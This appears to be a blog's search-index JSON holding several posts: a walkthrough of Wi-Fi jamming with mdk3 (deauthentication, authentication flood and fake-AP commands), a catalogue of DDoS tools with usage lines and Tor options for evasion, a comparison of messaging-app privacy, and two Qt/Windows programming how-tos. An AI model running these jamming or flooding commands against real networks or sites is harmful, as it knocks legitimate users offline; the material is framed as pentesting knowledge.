[
  
  {
    "title": "Perform selective jamming of Wi-Fi networks and clients with mdk3(DoS attack on APs/clients)",
    "url": "/posts/mdk3/",
    "categories": "Linux, Pentest",
    "tags": "Linux, Pentest",
    "date": "2021-11-20 00:00:00 +0900",
    





    
    "snippet": "Introductionmdk3 is used for stress testing 802.11 networks(wifi). It consists of various methods by which we can perform tests. Some of  major method sare beacon flooding, deauthentication, WPA- d...",
    "content": "Introductionmdk3 is used for stress testing 802.11 networks(wifi). It consists of various methods by which we can perform tests. Some of  major method sare beacon flooding, deauthentication, WPA- dos etc‚Ä¶mdk3 Description  MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.MDK3 is a tool that ‚Äúinjects‚Äù data into wireless networks. ‚ÄúInjection‚Äù is the possibility to send self-made data through the air without being connected or associated to any network or station. MDK3 is used to send valid and invalid packets, which belong to the wireless management and not to regular data connections.Homepage: https://github.com/charlesxsh/mdk3-masterAuthor: ASPj of k2wrlzLicense: GPLv2Purpose  Sends beacon frames to show fake APs at clients. (Beacon Flooding)  Sends authentication frames to all APs found in range. (Authentication DoS)  Kicks everybody found from AP. (Deauthentication / Disassociation Amok)You need‚Ä¶  Linux based system.  mdk3 installed  Wireless cardInstall mdk3$sudo apt-get install mdk3If mdk3 is successfully installed, try to run it!‚îå‚îÄ[theodore@parrot]‚îÄ[~]‚îî‚îÄ‚îÄ‚ïº $sudo mdk3[sudo] password for theodore: MDK 3.0 v6 - \"Yeah, well, whatever\"by ASPj of k2wrlz, using the osdep library from aircrack-ngAnd with lots of help from the great aircrack-ng community:Antragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape,telek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid GajownikTHANK YOU!MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.IMPORTANT: It is your responsibility to make sure you have permission from thenetwork owner before running MDK against it.This code is licenced under the GPLv2Check the wireless card$sudo ifconfigFor me, my card‚Äôs name is wlx48022a54bc53, in this article I will use the name wlan0 instead of this.Beacon Flooding  Set the wireless card to Monitor Mode:$sudo airmon-ng start wlan0‚îå‚îÄ[theodore@parrot]‚îÄ[~]‚îî‚îÄ‚îÄ‚ïº $sudo airmon-ng start wlx48022a54bc53[sudo] password for theodore: Found 2 processes that could cause trouble.Kill them using 'airmon-ng check kill' before puttingthe card in monitor mode, they will interfere by changing channelsand sometimes putting the interface back in managed mode    PID Name    679 NetworkManager    693 wpa_supplicantPHY\tInterface\tDriver\t\tChipsetphy0\twlx48022a54bc53\trt2800usb\tRalink Technology, Corp. RT2870/RT3070Interface wlx48022a54bc53mon is too long for linux so it will be renamed to the old style (wlan#) name.\t\t(mac80211 monitor mode vif enabled on [phy0]wlan0mon\t\t(mac80211 station mode vif disabled for [phy0]wlx48022a54bc53)  (mac80211 monitor mode vif enabled on [phy0]wlan0mon  Create fake APs:$sudo mdk3 wlan0mon b -n WIFI_NAME -t -c 6 -s 80 \t# after arg `-c` is the channel,# `-s` sets the speed in packets per second (Default: 50)P.S.1. Mass create fake APsFirstly, create a wifi_list.txt file, in the file stored all the AP‚Äôs names you want to create.For example:AP-0AP-1AP-2AP-3Then, start mdk3 with this command:$sudo mdk3 wlan0mon b -f /path/to/wifi_list.txt -t -c 6 P.S.2. Create fake APs with random names$sudo mdk3 wlan0mon bAuthentication DoS  Sends authentication frames to all APs found in range.Too much clients freeze or reset some APs.In some cases, the AP won‚Äôt freeze or reset, and even if it will not, it‚Äôs Internet speed will be very slow and hard to use.See all AP nearby:$sudo airodump-ng wlan0monCH  6 ][ Elapsed: 1 min ][ 2021-11-20 20:59  BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSI 48:0E:EC:A1:8D:3F   -1        0        1    0   7   -1   WPA              &lt;len 00:1F:7A:52:62:B1   -1        0        0    0   6   -1                    &lt;len 88:C3:97:F0:D0:4C  -23       52        0    0   6  195   WPA2 CCMP   PSK   90:47:3C:06:7E:F0  -37       34        0    0   5  130   WPA2 CCMP   PSK   A8:C2:52:02:FC:A1  -45       37        0    0   1  270   WPA2 CCMP   PSK  &lt;len A8:C2:52:02:FC:A0  -45       29        3    0   1  270   WPA2 CCMP   PSK   7C:94:2A:88:CA:94  -45       34        0    0   6  270   WPA2 CCMP   PSK   A8:C2:52:02:FC:A5  -45       27        0    0   1  270   WPA2 CCMP   PSK  &lt;len 7C:94:2A:88:CA:95  -69       27        0    0   6  270   WPA2 CCMP   PSK  &lt;len 08:F4:58:D2:66:FD  -51       26        0    0  11  360   WPA2 CCMP   PSK  &lt;len 08:F4:58:D2:66:F8  -51       29        1    0  11  360   WPA2 CCMP   PSK   9C:A6:15:6D:BA:DB  -50       22        0    0  11  405   WPA2 CCMP   PSK   E4:BD:4B:AB:AD:08  -53       38        0    0   4  130   WPA2 CCMP   PSK   08:F4:58:D2:66:F9  -50       38        2    0  11  400   OPN               14:AD:CA:3A:21:5E  -53       39        0    0   8  270   WPA2 CCMP   PSK   E2:92:66:99:A8:0F  -52        0        1    0   6  130   WPA2 CCMP   PSK   74:54:27:60:F0:1A  -53       33        4    0   1  540   WPA2 CCMP   PSK  Start attack.Command:$sudo mdk3 wlan0mon a -a TARGET_MAC_ADDRESSDeauthentication / Disassociation AmokFrom sudo airodump-ng wlan0mon we get a lot of information. Access points, mac IDs, clients, channel on which each AP broadcasts etc. Now we choose a channel to attack against.Example:$sudo mdk3 wlan0mon d -c 11 \t#launch an attack against channel 11"
  },
  
  {
    "title": "Is Telegram really anonymous & \"focus on privacy\" as it advertises? IM software comparison",
    "url": "/posts/telegram/",
    "categories": "Others, Pentest",
    "tags": "Others, Pentest",
    "date": "2021-09-21 00:00:00 +0900",
    





    
    "snippet": "IntroductionNow, more and more people wants to be anonymous. The anonymity in everyday life enables people to be free to do many worthwhile things without feeling inhibited. Telegram, an IM known a...",
    "content": "IntroductionNow, more and more people wants to be anonymous. The anonymity in everyday life enables people to be free to do many worthwhile things without feeling inhibited. Telegram, an IM known as ‚Äúfocus on security and privacy‚Äù, is chosen. But, does Telegram really ‚Äúfocus on security and privacy‚Äù as it advertises? Today, we‚Äôll compare Telegram with other IM software. I‚Äôll show you different softwares‚Äô advantage and disadvantage, and help you decide which one to choose.What is IM?Instant messaging (IM) technology is a type of online chat allowing real-time text transmission over the Internet or another computer network. Some example of IM:  WhatsApp  Slack  Jabber  Spark  Telegram  Signal  . . .About TelegramWhat is Telegram?Copied from Wikipediaüòù:  Telegram is a free and open source, cross-platform, cloud-based instant messaging (IM) software. This service also provides end-to-end encrypted video calling, VoIP, file sharing and several other features.Advantages of Telegram  Telegram provides end-to-end encrypted voice and video calls and optional end-to-end encrypted ‚Äúsecret‚Äù chats. Cloud chats and groups are encrypted between the app and the server, so that ISPs and other third-parties on the network can‚Äôt access data, but the Telegram server can. Users can send text and voice messages, make voice and video calls, and share an unlimited number of images, documents (2 GB per file), user locations, animated stickers, contacts, and audio files.  Easy to use, user-friendly  Nice User Interface  Cross-platform(Windows, Android, iOS, OSX, Linux‚Ä¶)  Support setting chat records to be destroyed regularly  Support  deleting account, after deleting the account, all related information will be destroyed at the same time  Free, non-profit, never sell advertisements, never accept external investmentDisadvantages of TelegramWell, no data will be collected while using Telegram, end-to-end encryption is one hundred percent safe, but it doesn‚Äôt mean that Telegram is anoymous.In fact, Telegram has no anonymity1. Bind phone numberAny network tool that needs to be bound to a mobile phone (whether it is IM or email) will greatly reduce your invisibility.AnyoneGet contacts automatically once owns the phone number has the complete control over the Telegram account. I will talk about the issue of mobile phone number and anonymity below.Anyway, be sure to have control over the bound mobile phone number!2. Get contacts[can be solved]Telegram will scan your phone coanonymityntact and import numbers from it.Your can disable this function however.3. Last seen time[can be solved]Telegram will show your ‚ÄúLast seen time‚Äù defaultly, it may affect anonymity.So, it‚Äôs neccessary to set ‚ÄúDo not show last seen time‚Äù in Telegram. In some groups, Telegram will show accounts which is typing, there‚Äôs also a way to avoid this. Put your full name into line editor ‚ÄúLast Name‚Äù and leave a space in ‚ÄúFIrst Name‚Äù. Then your typing state won‚Äôt be shown.About phone numbersPhysical SIM cardsIn some countries, you‚Äôll need to offer your true identity to get a SIM card. Obviously, it‚Äôs quite hard to keep anonymous with a physical SIM card.VoIPFree VoIPs are hard to get, and many of them have short avalible time. Moreover, using VoIP will have the risk of being deleted in Telegram(Deleted Account).Other IMsWhatsApp:  [‚úîÔ∏è] User-friendly  [‚ùå] Do not need to bind phone numbers.  [‚ùì] Safety.  [‚ùå] Anonymity.  [‚úîÔ∏è] Is it popular?Signal:  [‚ùå] User-friendly  [‚ùå] Do not need to bind phone numbers.  [‚úîÔ∏è] Safety.  [‚ùå] Anonymity.  [‚úîÔ∏è] Is it popular?Element(Riot):  [‚úîÔ∏è] User-friendly  [‚úîÔ∏è] Do not need to bind phone numbers.  [‚úîÔ∏è] Safety.  [‚ùå] Anonymity.  [‚ùå] Is it popular?Wire:  [‚ùå] User-friendly  [‚úîÔ∏è] Do not need to bind phone numbers.  [‚úîÔ∏è] Safety.  [‚ùå] Anonymity.  [‚ùå] Is it popular?Discord:  [‚úîÔ∏è] User-friendly  [‚ùå] Do not need to bind phone numbers.  [‚ùì] Safety.  [‚ùå] Anonymity.  [‚úîÔ∏è] Is it popular?Wechat:  [‚ùì] User-friendly  [‚ùå] Do not need to bind phone numbers.  [‚ùå] Safety.  [‚ùå] Anonymity.  [‚úîÔ∏è] Is it popular?Messenger:  [‚ùì] User-friendly  [‚ùå] Do not need to bind phone numbers.  [‚ùå] Safety.  [‚ùå] Anonymity.  [‚úîÔ∏è] Is it popular?Tox:  [‚ùå] User-friendly  [‚úîÔ∏è] Do not need to bind phone numbers.  [‚úîÔ∏è] Do not need to bind email.  [‚úîÔ∏è] Safety.  [‚úîÔ∏è] Anonymity.  [‚ùå] Is it popular?BitMessage:  [‚ùå] User-friendly  [‚úîÔ∏è] Do not need to bind phone numbers.  [‚úîÔ∏è] Do not need to bind email.  [‚úîÔ∏è] Safety.  [‚úîÔ∏è] Anonymity.  [‚ùå] Is it popular?Bridgefy:  [‚ùå] User-friendly  [‚úîÔ∏è] Do not need to bind phone numbers.  [‚úîÔ∏è] Do not need to bind email.  [‚ùå] Safety.  [‚ùå] Anonymity.  [‚ùå] Is it popular?  [‚úîÔ∏è] Offline messaging.  [‚ùå Only iOS &amp; Android]Cross-platformIdeal IM‚Ä¶All the mentioned IMs have their own advantages and disadvantages, so what is the best one? My answer is: neither of them. Which one to choose depends on your own ideas. For me, Telegram is safe enough and user-friendly.PS: Tips while using Telegram1. Set Passcode &amp; Face IDTo prevent others from peeking at the messages when the phone isn‚Äôt around.2. Two-step verification3. Privacy Settings  No one can see my numbers  No one can see my last seen time  Only contact can see profile photos  Only contact can call me  Only contact can add me in a group  Avoid using true numbers, use a VoIP instead  Use proxy  . . ."
  },
  
  {
    "title": "Collection of the best & most popular DDos-attack tools",
    "url": "/posts/ddos-tools/",
    "categories": "Pentest",
    "tags": "Pentest",
    "date": "2021-08-10 00:00:00 +0900",
    





    
    "snippet": "What is DDos?  In computing, a denial-of-service attack is a cyber-attack in which the perpetrator seeks to make a machine or network resource unavailable to its intended users by temporarily or in...",
    "content": "What is DDos?  In computing, a denial-of-service attack is a cyber-attack in which the perpetrator seeks to make a machine or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet.How to get the collection?‚Äã\tAll the tools have been pushed to my github repository: Download: the0cp/DDos-Attack-Tools  The collection will keep updating, adding new tools &amp; tutorials. Please Follow/Watch/Star to get the latest updating.More projects: @the0cpReach me: Hi there!üëã I‚Äôm Theodore!DisclaimerAll collected tools and scripts come from the Internet and have passed the test, but we are not responsible for any undetected danger of software or scripts that may cause harm to your computer.LEGAL NOTICETHESE SOFTWARES AND SCRIPTS ARE PROVIDED FOR EDUCATIONAL USE ONLY! IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY WE DO NOT TAKE ANY RESPONSIBILITY FOR IT. BY USING THESE SOFTWARES AND SCRIPTS YOU AGREE WITH THESE TERMS.Software &amp; Script Info1. LOIC (Low Orbit Ion Cannon_Windows)  LOIC is an open-source network stress testing and denial-of-service attack application, written in C#. LOIC was initially developed by Praetox Technologies, but was later released into the public domain, and now is hosted on several open source platforms.2. davoset  DDoS attacks via other sites execution tool. It is console (command line) tool for conducting DDoS attacks on the sites via Abuse of Functionality and XML External Entities vulnerabilities at other sites.3. ddosim  DDOSIM is a tool that can be used in a laboratory environment to simulate a distributed denial of service (DDOS) attack against a target server. ‚Ä¶ It simulates several zombie hosts (having random IP addresses) which create full TCP connections to the target server.4. GoldenEye  GoldenEye is an python app for security testing.GoldenEye is a HTTP DoS Test Tool.  Usage   USAGE: ./goldeneye.py &lt;url&gt; [OPTIONS]   OPTIONS:    Flag           Description                     Default    -u, --useragents   File with user-agents to use                     (default: randomly generated)    -w, --workers      Number of concurrent workers                     (default: 50)    -s, --sockets      Number of concurrent sockets                     (default: 30)    -m, --method       HTTP Method to use 'get' or 'post'  or 'random'  (default: get)    -d, --debug        Enable Debug Mode [more verbose output]          (default: False)    -h, --help         Shows this help #### Utilities * util/getuas.py - Fetchs user-agent lists from http://www.useragentstring.com/pages/useragentstring.php subpages (ex: ./getuas.py http://www.useragentstring.com/pages/Browserlist/) *REQUIRES BEAUTIFULSOUP4* * res/lists/useragents - Text lists (one per line) of User-Agent strings (from http://www.useragentstring.com) #### License This software is distributed under the GNU General Public License version 3 (GPLv3)5. Hoic (High Orbit Ion Cannon)  Hoic is an open-source network stress testing and denial-of-service attack application designed to attack as many as 256 URLs at the same time. It was designed to replace the Low Orbit Ion Cannon which was developed by Praetox Technologies and later released into the public domain.6. HULK (HTTPS Unbearable Load King)Introduction  This script is a Distributed Denial of Service tool that can put heavy load on HTTPS servers,in order to bring them to their knees, by exhausting the resource pool.Its is meant for research purposes only and any malicious usage of this tool is prohibited.The authors aren‚Äôt to be held responsible for any consequence of usage of this tool. Authors : Hyperclaw79, version 3.0, 2.0; Barry Shteiman , version 1.0Usage  Run pip install -r requirements.txt before starting this script.  Launch the hulk-server.py with the target website as arg.  python hulk-server.py https://testdummysite.com      Launch the hulk-launcher.py to spawn multiple processes of hulk - one per CPU Core.  python hulk-launcher.py localhost          If it‚Äôs a bot on a remote client, replace localhost with the server‚Äôs IP.        Sit back and sip your coffee while the carnage unleashes! &gt;:D    License    HULK v3 is a Python 3 compatible Asynchronous Distributed Denial of Service Script.Original script was created by Barry Shteiman.You can use that one if you have Python 2.  Using a GNU license cause there was no mention about any license used by Barry.Feel free to modify and share it, but leave some credits to us both and don‚Äôt hold us liable.7. pyloris  Using HTTPLoris is simple. In its most basic form, HTTPLoris merely needs a copy of Python 2.6.UsageOn a Linux machine, one must simply invoke the script in a terminal, stating a site to test:motoma@rocksalt:/home/motoma$ python pyloris-3.0.py motomastyle.comOn Mac OS X, one invokes PyLoris the same way. Using the Terminal Application:hotdog:/Users/Motoma/ motoma$ python pyloris-3.0.py motomastyle.comUsing HTTPLoris in Windows is a little different. One will need to know the location of the Python installation, and be in the proper directory. Load up a command prompt:C:\\Users\\Motoma\\Desktop\\pyloris-3.0&gt;C:\\Python26\\python.exe pyloris-3.0.py motomastyle.comAdvanced OptionsInvoking HTTPLoris by using the commands above start a limited to 500 connections across 50 threads, each sending at 1 byte/second and waiting until the connection is forced shut by the server. While this behavior will bog down an Apache server with the default settings, it is not a very thorough test. The following are some additionall options that will allow one to customize the way HTTPLoris works:-a, --attacklimitThe --attacklimit flag restricts the number of total connections (current + completed) during a single session. Set this to zero to specify no limit.-c, --connectionlimitAdjusting the --connectionlimit flag can drastically change how well HTTPLoris performs. The --connectionlimit flag directly controls the number of concurrent connections held during the session. In a base Apache environment, when this number is above the MaxClients setting, the server is unresponsive.-t, --threadlimitThis is the number of attacker threads run during the session.-b, --connectionspeedThis is the connection speed for each individual connection in bytes/second. Comparing this with the lenght of the request, and you should have an accurate guess of how long each connection should linger.-f, --finishSpecifying the --finish flag will cause HTTPLoris to finish and close connections upon the completion of the request. This will prompt servers to send full responses to the HTTP requests that are made.-k --keepaliveUsing the --keepalive flag will add the Connection: Keep-Alive header to the HTTP request. On vulnerable servers, this will increase the duration of connections considerably.-p, --portHTTPLoris will connect on port 80 by default. Specifying the --port flag will change this behavior.-P, --pageBy default, HTTPLoris will make HTTP requests for \"/\". Setting the --page flag will allow one to control the page that HTTPLoris requests.-q, --quitTerminate the connection without receiving reply from the server. This will reduce the effectivenes as connections will terminate as soon as the full request buffer has been sent.-r, --requesttypeSetting the --requesttype flag will change the HTTP method used. Available options are GET, HEAD, POST, PUT, DELETE, OPTIONS, and TRACE. Certain proxies and load balancers will filter out certain types of requests, and hold them until the requests are complete. POST requests are commonly passed through due to their potential for large sizes, therefore this may cause different behavior.-R, --refererAdds a referring URL to the HTTP request.-s, --SizeThe --size flag allows one to increase the size of the request made. Increasing the size will in turn increase the duration of connections, leading to a longer sustained test. In situations where servers or firewalls are set to terminate unfinished connections, this can extend the length of the test drastically. This can also be used to test a web server's capability to handle multiple large requests and benchmark memory usage. The additional data is filled in the Cookie-Data field.-u, --useragentBy default, HTTPLoris advertizes itself in the User-Agent header. The --useragent flag allows one to override this and masquerade as other web browsers. Useful because some sites will render different pages for different web browsers. -z, --gzipSpecifying the --gzip flag will allow instruct PyLoris to send an \"Accept-Encoding: gzip\" header. When combined with the --quit and --finish flags, this can test for the CEV-2009-1891 DoS vulnerability (http://www.mail-archive.com/dev@httpd.apache.org/msg44323.html). Also leads to larger CPU usage and smaller bandwidth usage.-w, --timebetweenthreadsSetting the --timebetweenthreads flag will adjust the amount of time between threads spawning. Adjusting this in conjunction with the --threadlimit will change the CPU load on your local machine.-W, --timebetweenconnectionsSetting the --timebetweenconnections flag will adjust the amount of time between socket connections. This will directly affect how quickly the target's connection limit is reached.Proxy Options HTTPLoris is able to connect through SOCKS4, SOCKS5, and HTTP proxies. This allows HTTPLoris to run through SSH tunnels, as well as TOR. Utilizing TOR should essentially eliminate the mitigating effects of ipchains, mod_antiloris, and mod_noloris.--socksversionSetting the --socksversion flag tells HTTPLoris to connect through a SOCKS proxy. Allowed values are SOCKS4, SOCKS5, and HTTP.--sockshostSet the --sockshost flag to the address of the SOCKS proxy when --socksversion is set. If this is not set, HTTPLoris will default to 127.0.0.1.--socksportSet the --socksport flag to the port number of the SOCKS proxy when --socksversion is set. --socksuser and --sockspassOptionally, one may set a username and password for the SOCKS proxy using these two flags.8. Rudy (R U Dead yet)  ‚ÄòR U Dead Yet?‚Äô or R.U.D.Y. is a denial-of-service attack tool that aims to keep a web server tied up by submitting form data at an absurdly slow pace. A R.U.D.Y. exploit is categorized as a low-and-slow attack, since it focuses on creating a few drawn-out requests rather than overwhelming a server with a high volume of quick requests. A successful R.U.D.Y. attack will result in the victim‚Äôs origin server becoming unavailable to legitimate traffic.The R.U.D.Y. software includes a user-friendly point-and-click interface, so all an attacker needs to do is point the tool at a vulnerable target. Any web service that accepts form input is vulnerable to a R.U.D.Y. attack, since the tool works by sniffing out form fields and exploiting the form submission process.9. TorshammerUSAGE:./torshammer.py -t &lt;target&gt; [-r &lt;threads&gt; -p &lt;port&gt; -T -h]-t|--target &lt;Hostname|IP&gt;-r|--threads &lt;Number of threads&gt; Defaults to 256-p|--port &lt;Web Server Port&gt; Defaults to 80-T|--tor Enable anonymising through tor on 127.0.0.1:9050-h|--help Shows this helpEg. ./torshammer.py -t 192.168.1.100 -r 25610. hpingDESCRIPTION\thping3 is a network tool able to send custom TCP/IP\tpackets and to display target replies like ping do with\tICMP replies. hping3 can handle fragmentation, and\talmost arbitrary packet size and content, using the\tcommand line interface.\tSince version 3, hping implements scripting capabilties,\tread the API.txt file under the /docs directory to know\tmore about it.\tAs a command line utility, hping is useful to test at\tmany kind of networking devices like firewalls, routers,\tand so. It can be used as a traceroute alike program over all\tthe supported protocols, firewalk usage, OS fingerprinting,\tport-scanner (see the --scan option introduced with hping3),\tTCP/IP stack auditing.\tIt's also really a good didactic tool to learn TCP/IP.\tUsing Tcl/Tk scripting much more can be done, because\twhile the hping3 packet generation code is actually the\thping2 put there mainly for compatibility with the command\tline interface, all the real news are about scripting.\tSee the libs directory for example scripts. To run\tthe example scripts type:\t\thping3 exec ScriptName.htcl &lt;arguments, if required&gt;\thping3 is developed and manteined by antirez@invece.org\twith the help of other hackers, and comes under GPL version\t2 of license. Development is open so you can send me\tpatches/suggestions/affronts without inhibitions.\tPlease check the AUTHORS file for a list of people that\tcontribued with code, ideas, bug reports.\tAlso vim developer, ee.lbl.gov for tcpdump and GNU in general.DOCUMENTATION\tFor the hping3 API check docs/API.txt\tYou can find documentation about hping3 specific functions\tat http://wiki.hping.org\tMake sure to check the page at http://wiki.hping.org/34REQUIREMENTS\tA supported unix-like OS, gcc, root access.\tLibpcap.\tTcl/Tk is optional but strongly suggested.INSTALLATION\tsee INSTALL file.have fun,antirez11. #Refref#Refref - An SQLi injection DDOS tool12. HyenaeFeatures  ARP-Request flooding  ARP-Cache poisoning  PPPoE session initiation flooding  Blind PPPoE session termination  ICMP-Echo flooding  ICMP-Smurf attack  ICMP based TCP-Connection reset  TCP-SYN flooding  TCP-Land attack  Blind TCP-Connection reset  UDP flooding  DNS-Query flooding  DHCP-Discover flooding  DHCP starvation attack  DHCP-Release forcing  Cisco HSRP active router hijacking  Pattern based packet address configuration  Intelligent address and address protocol detection  Smart wildcard-based randomization  Daemon for setting up remote attack networks - HyenaeFE QT-Frontend support13. Boom(Python)14. RCPnet  A multi-tool for network pen-testing written in python. It contains effective ping functions, hostname traceroute, and cloudflare detection. This is a modification from the FoxNuke Project, which only intended to be a DOS tool for network pen testing.15. MaddStress  MaddStress is a simple denial-of-service (DDoS) attack tool that refers to attempts to burden a network or server with requests, making it unavailable to users.Features  Strongest &amp; Best DDoS Tools  UDP Configuration  TCP Configuration  SYN Configuration  Proxy Configuration  URL Grabber  Port Scanner  CloudFlare Resolver  Multi CloudFlare Resolver  Proxy Attack &amp; Generator  Always Updates &amp; Current News  System Information  Network Information  Simple Design UI  User friendly GUI16. Dequiem  Dequiem is a DDoS tool written in python 2.7Features  DDoS  Find a website‚Äôs IP  Port Scanning17. NEMESIS  NEMESIS is tool like torshammer or pyloic, used to Distributed Denial of Service attacks, writen in C#18. ChiHULK  Written in python 2.7Edited version of the DDoS / DoS tool called HULK(.py).19. PentaDos  Written in python 2.7A tool designed by members of PentagonCrew to helpyou easily take down websites. Ethical uses only20. Moihack DoS Attack Tool Reloaded  A simple TCP/UDP Port Flooder written in Python.21. Slowloris22. AnDDoS  Stealth Anonymous Kill-The-Server  The classic DDoS! Overload the server.23. torDDosAuthor: r3nt0n  TorDDos is a Python tool to automatize DDos attacks to a website from the Tor network.Usage  -h, --help        show this help message and exit  -t , --target     server to kick-out  -n , --attempts   number of attempts of attack (default: 5)How it works  Creates a new Tor session.  Makes a request to the website you choose as a target.  Releases the Tor session, then creates another and request data again to the website.Requirements  Linux system  Python 2.7  Tor service  requestsLegal disclaimerThis tool is created for the sole purpose of security awareness and education, it should not be used against systems that you do not have permission to test/attack. The author is not responsible for misuse or for any damage that you may cause. You agree that you use this software at your own risk."
  },
  
  {
    "title": "Solve Qt: libpng warning: iCCP: known incorrect sRGB profile",
    "url": "/posts/qt-libpng-warning/",
    "categories": "Qt",
    "tags": "Qt",
    "date": "2021-07-26 00:00:00 +0900",
    





    
    "snippet": "Why this happens?This warning is mainly related to the format of the PNG image. In fact, to solve this warning, we just need to convert the image to a correct profile. There are many ways to solve ...",
    "content": "Why this happens?This warning is mainly related to the format of the PNG image. In fact, to solve this warning, we just need to convert the image to a correct profile. There are many ways to solve this in both Windows and Linux.WindowsMethod 1: ImageMagickWe use ImageMagick to convert the image: ImageMagick Official  Download the corresponding compressed package according to the platform (such as Windows x64)  Unzip the downloaded compressed package to anywhere you want, we suppose your target path is $PATH.  Create a new .bat file in the PNG folder, for example convert.bat.  Edit the content of convert.bat:@echo offecho ImageMagick is fixing libpng warningset fn = $PATH\\convert.exefor /f \"tokens=*\" %%i in ('dir/s/b *.png') do \"%fn%\" \"%%i\" -strip \"%%i\"pause  Save the convert.bat, then double click to run it.Method 2: Photoshop  Open the image with Photoshop.  Click Edit on the tool bar.  Change the image profile to ‚ÄúAdobe RGB (1998)‚Äù.Method 3: QImageQImage img;img.load(\"1.png\");img.save(\"1.png\");LinuxMethod 1: convertIt‚Äôs the easiest way to solve the warning in Linux:$ convert input.png output.pngIf you don‚Äôt have a convert command, just install it, it is included in ImageMagick:$ sudo apt-get install imagemagick$ convert -versionconvert also has many more excellent functions, you can resize your image like this:$ convert -resize 1024x1024 input.png output.pngRotate the image:$ convert -rotate 270 input.png output.png    #clockwise rotate 270 degreesEven add characters:$ convert -fill COLOR -pointsize SIZE -font FONT -draw 'text X,Y \"Hello, World!\"' input.png output.png And many more‚Ä¶Method 2: QImage()QImage img;img.load(\"1.png\");img.save(\"1.png\");"
  },
  
  {
    "title": "Run a CMD command in Qt without displaying the CMD window",
    "url": "/posts/qtcmd/",
    "categories": "Qt, C/C++",
    "tags": "Qt, C/C++",
    "date": "2021-06-25 00:00:00 +0900",
    





    
    "snippet": "Method 1: system‚Äã\tIt‚Äôs the most basic method not only used in Qt, you should include the library stdlib.h.‚Äã\tBut, you have to see the ugly black cmd window.            Header                  stdlib...",
    "content": "Method 1: system‚Äã\tIt‚Äôs the most basic method not only used in Qt, you should include the library stdlib.h.‚Äã\tBut, you have to see the ugly black cmd window.            Header                  stdlib.h      Syntaxint system (const char* command);Parameterscommand:‚Äã\t C-string containing the system command to be executed. \tOr, alternatively, a null pointer, to check for a command processor.Return Value‚Äã\t If command is a null pointer, the function returns a non-zero value in case a command processor is available and a zero value if it is not. \tIf command is not a null pointer, the value returned depends  on the system and library implementations, but it is generally expected  to be the status code returned by the called command, if supported.Example/******example: ping******/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){\tprintf(\"checking processor\\n\");\tif (system(NULL)) puts (\"Ok\");    \telse exit (EXIT_FAILURE);\tprintf(\"start ping\\n\");\tsystem(\"ping localhost &gt;&gt; res.txt\");\treturn 0;}‚Äã\tYou can see the ping‚Äôs result in res.txt after running these code.Is here some method I can take to avoid displaying the cmd window? The answer is: YES.Method 2Ôºö WinExec ‚Äì without cmd window‚Äã\tWinExec() is another way to run a command, the advantage of using WinExec() is you don‚Äôt need to display the window, it means, you can hide the window. It needs winbase.h &amp; windows.h.‚Äã\tBUT, this function is provided only for compatibility with 16-bit Windows. Applications should use the  CreateProcess() function(as follows).            Header                  windows.hwinbase.h      SyntaxUINT WinExec(  LPCSTR lpCmdLine,  UINT   uCmdShow);ParameterslpCmdLine:‚Äã\tThe command line (file name plus optional parameters) for the application to be executed.uCmdShow:‚Äã\tThe display options.‚Äã\tList of the acceptable values:            Value      Meaning                  SW_HIDE 0      Hides the window and activates another window.              SW_SHOWNORMAL SW_NORMAL 1      Activates and displays a window. If the window is minimized or  maximized, the system restores it to its original size and position. An  application should specify this flag when displaying the window for the  first time.              SW_SHOWMINIMIZED 2      Activates the window and displays it as a minimized window.              SW_SHOWMAXIMIZED SW_MAXIMIZE 3      Activates the window and displays it as a maximized window.              SW_SHOWNOACTIVATE 4      Displays a window in its most recent size and position. This value is similar to SW_SHOWNORMAL, except that the window is not activated.              SW_SHOW 5      Activates the window and displays it in its current size and position.              SW_MINIMIZE 6      Minimizes the specified window and activates the next top-level window in the Z order.              SW_SHOWMINNOACTIVE 7      Displays the window as a minimized window. This value is similar to SW_SHOWMINIMIZED, except the window is not activated.              SW_SHOWNA 8      Displays the window in its current size and position. This value is similar to SW_SHOW, except that the window is not activated.              SW_RESTORE 9      Activates and displays the window. If the window is minimized or  maximized, the system restores it to its original size and position. An  application should specify this flag when restoring a minimized window.              SW_SHOWDEFAULT 10      Sets the show state based on the SW_ value specified in the STARTUPINFO structure passed to the CreateProcess() function by the program that started the application.              SW_FORCEMINIMIZE 11      Minimizes a window, even if the thread that owns the window is not  responding. This flag should only be used when minimizing windows from a different thread.      Return value‚Äã\tIf the function succeeds, the return value is greater than 31.‚Äã\tIf the function fails, the return value is one of the following error values.            Return code/value      Description                  0      The system is out of memory or resources.              ERROR_BAD_FORMAT      The .exe file is invalid.              ERROR_FILE_NOT_FOUND      The specified file was not found.              ERROR_PATH_NOT_FOUND      The specified path was not found.      Example/******example: ping******/#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;winbase.h&gt;int main(){\tprintf(\"start ping\\n\");\tWinExec(\"cmd.exe /c ping localhost &gt;&gt; res.txt\", SW_HIDE);\t\t/*\t'/c' can't be ignored as you have arguments after 'cmd.exe'\t*/\treturn 0;}‚Äã\tWith this function you cannot determine whether the command is completed, because it is executed asynchronously.‚Äã\tYou must use CreateProcess() to solve the problem.Method 3: CreateProcess ‚Äì without cmd window‚Äã\tThis function is used to run a new program. It creates a new process and its primary thread. The new process executes the specified executable file.            Header                  windows.h      SyntaxBOOL CreateProcess( \tLPCWSTR lpszImageName, \tLPCWSTR lpszCmdLine, \tLPSECURITY_ATTRIBUTES lpsaProcess, \tLPSECURITY_ATTRIBUTES lpsaThread, \tBOOL fInheritHandles, \tDWORD fdwCreate, \tLPVOID lpvEnvironment, \tLPWSTR lpszCurDir, \tLPSTARTUPINFOW lpsiStartInfo, \tLPPROCESS_INFORMATION lppiProcInfo); ParameterslpszImageName: \tPointer to a null-terminated string that specifies the module to execute.‚Äã\tThe string can specify the full path and filename of the module to execute or it can specify a partial path and filename.‚Äã\tThe lpszImageName parameter must be non-NULL and must include the module name.lpszCmdLine: \tPointer to a null-terminated string that specifies the command line to  execute. The system adds a null character to the command line, trimming  the string if necessary, to indicate which file was actually used.‚Äã\tThe 